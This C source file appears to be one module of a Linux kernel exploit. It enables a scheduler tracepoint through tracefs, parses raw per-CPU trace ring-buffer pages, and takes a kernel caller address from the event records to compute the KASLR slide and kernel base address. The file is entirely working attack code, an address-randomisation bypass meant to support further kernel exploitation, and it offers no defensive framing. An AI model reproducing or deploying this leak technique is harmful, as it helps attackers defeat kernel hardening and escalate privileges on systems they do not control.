#include "common.h"

#define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
#ifndef SLIDE_TRACEFS_EVENT_ID
#define SLIDE_TRACEFS_EVENT_ID 109
#endif

#ifdef SLIDE_TRACEFS_EXTRA_EVENT
static uint16_t slide_tracefs_extra_event_id;
#endif

static int slide_tracefs_write(const char *path, const char *value) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  size_t len = strlen(value);
  ssize_t wrote = write(fd, value, len);
  close(fd);
  return wrote == (ssize_t)len;
}

static int slide_tracefs_parse_page(
    const unsigned char *page, size_t page_len, uintptr_t *candidate_out) {
  if (page_len < 20) {
    return 0;
  }

  uint64_t commit = 0;
  memcpy(&commit, page + 8, sizeof(commit));
  size_t data_len = (size_t)(commit & 0xfffULL);
  size_t end = 16 + data_len;
  if (end > page_len) {
    end = page_len;
  }

  for (size_t pos = 16; pos + 4 <= end;) {
    uint32_t event_header = 0;
    memcpy(&event_header, page + pos, sizeof(event_header));
    uint32_t type_len = event_header & 0x1fU;
    if (type_len == 30) {
      pos += 8;
      continue;
    }
    if (type_len == 31) {
      pos += 12;
      continue;
    }
    if (type_len == 0 || type_len >= 29) {
      break;
    }

    size_t record_len = (size_t)type_len * 4;
    size_t record = pos + 4;
    if (record + record_len > end) {
      break;
    }
    uint16_t event_id = 0;
    memcpy(&event_id, page + record, sizeof(event_id));
#ifdef SLIDE_TRACEFS_EXTRA_EVENT
    uint16_t target_id = slide_tracefs_extra_event_id ?
                         slide_tracefs_extra_event_id : SLIDE_TRACEFS_EVENT_ID;
#else
    uint16_t target_id = SLIDE_TRACEFS_EVENT_ID;
#endif
    if (event_id == target_id && record_len >= 24) {
      uint64_t caller = 0;
      memcpy(&caller, page + record + 16, sizeof(caller));
      uint64_t link_caller =
          KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
      if (caller >= link_caller) {
        uint64_t candidate = caller - link_caller;
        if (candidate <= 0x1f0000ULL && (candidate & 0xffffULL) == 0) {
          pr_success("slide tracefs caller=%016llx candidate=%08llx\n",
                     (unsigned long long)caller,
                     (unsigned long long)candidate);
          *candidate_out = (uintptr_t)candidate;
          return 1;
        }
      }
    }
    pos = record + record_len;
  }
  return 0;
}

static int slide_tracefs_leak_kernel_base(void) {
  static const char tracing_on[] =
      SLIDE_TRACEFS_ROOT "/tracing_on";
  static const char trace[] =
      SLIDE_TRACEFS_ROOT "/trace";
  static const char event_enable[] =
      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";

#ifdef SLIDE_TRACEFS_EXTRA_EVENT
  {
    char path[256];
    snprintf(path, sizeof(path),
             SLIDE_TRACEFS_ROOT "/events/" SLIDE_TRACEFS_EXTRA_EVENT "/id");
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd >= 0) {
      char buf[16];
      ssize_t got = read(fd, buf, sizeof(buf) - 1);
      close(fd);
      if (got > 0) {
        buf[got] = '\0';
        char *end = NULL;
        errno = 0;
        long id = strtol(buf, &end, 10);
        if (!errno && end > buf && (*end == '\n' || *end == '\0') &&
            id > 0 && id <= 0xffff) {
          slide_tracefs_extra_event_id = (uint16_t)id;
        }
      }
    }
    snprintf(path, sizeof(path),
             SLIDE_TRACEFS_ROOT "/events/" SLIDE_TRACEFS_EXTRA_EVENT "/enable");
    slide_tracefs_write(path, "1");
  }
#endif

  if (!slide_tracefs_write(tracing_on, "0") ||
      !slide_tracefs_write(event_enable, "1") ||
      !slide_tracefs_write(tracing_on, "1")) {
    pr_error("slide tracefs setup failed errno=%d\n", errno);
    return 0;
  }

  int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
  if (trace_fd >= 0) {
    close(trace_fd);
  }
  sleep(1);
  slide_tracefs_write(tracing_on, "0");

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  uintptr_t candidate = 0;
  int found = 0;
  for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
    char path[128];
    snprintf(path, sizeof(path),
             SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (fd < 0) {
      continue;
    }
    unsigned char page[4096];
    ssize_t got;
    while ((got = read(fd, page, sizeof(page))) > 0) {
      if (slide_tracefs_parse_page(page, (size_t)got, &candidate)) {
        found = 1;
        break;
      }
    }
    close(fd);
  }
  slide_tracefs_write(event_enable, "0");
#ifdef SLIDE_TRACEFS_EXTRA_EVENT
  {
    char path[256];
    snprintf(path, sizeof(path),
             SLIDE_TRACEFS_ROOT "/events/" SLIDE_TRACEFS_EXTRA_EVENT "/enable");
    slide_tracefs_write(path, "0");
  }
#endif
  if (!found) {
    pr_error("slide tracefs worker caller not found\n");
    return 0;
  }

  slide_p0_offset = candidate;
  kaslr_base = KIMAGE_TEXT_BASE + candidate;
  kaslr_slide = candidate;
  kaslr_done = 1;
  pr_success("slide-kaslr-ok source=tracefs pid=%d base=%016llx "
             "slide=%016llx p0_offset=%08zx\n",
             getpid(), (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide, slide_p0_offset);
  return 1;
}

int slide_leak_kernel_base(void) {
  const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
  if (forced_offset_arg && *forced_offset_arg) {
    char *end = NULL;
    errno = 0;
    unsigned long long value = strtoull(forced_offset_arg, &end, 0);
    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
        (value & 0xffffULL) != 0) {
      pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
      return 0;
    }
    slide_p0_offset = (uintptr_t)value;
    kaslr_base = KIMAGE_TEXT_BASE + slide_p0_offset;
    kaslr_slide = slide_p0_offset;
    kaslr_done = 1;
    pr_success("slide-kaslr-ok source=forced pid=%d base=%016llx "
               "slide=%016llx p0_offset=%08zx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide, slide_p0_offset);
    return 1;
  }
  return slide_tracefs_leak_kernel_base();
}
